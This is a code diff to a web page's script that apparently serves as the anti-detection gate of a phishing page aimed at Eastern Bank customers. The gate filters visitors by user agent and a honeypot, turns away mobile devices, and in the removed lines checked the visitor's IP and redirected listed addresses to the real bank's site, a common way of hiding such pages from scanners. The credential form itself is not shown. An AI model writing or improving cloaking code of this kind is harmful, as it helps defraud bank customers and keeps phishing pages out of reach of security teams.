@@ -34,21 +34,12 @@
   <script>
     (async function () {
       var t0 = Date.now();
-      // Entry gate (real desktop Chrome UA + honeypot).
+      // Entry gate (real desktop Chrome-on-Windows UA + honeypot).
       if (!window.gateStep({ entry: true })) return;
 
       if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
         window.location.href = "denied.html"; return;
       }
-      var ipify = await (async () => {
-        try {
-          const c = new AbortController(); const to = setTimeout(() => c.abort(), 3000);
-          const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
-          clearTimeout(to); return (await r.json()).ip;
-        } catch (e) { return null; }
-      })();
-      var blockedIPs = ['162.158.63.162','162.158.63.161','162.158.63.160'];
-      if (ipify && blockedIPs.includes(ipify)) { window.location.href = "https://www.easternbank.com/"; return; }
 
       const it = await window.issueToken();
       var TK = it.tok;
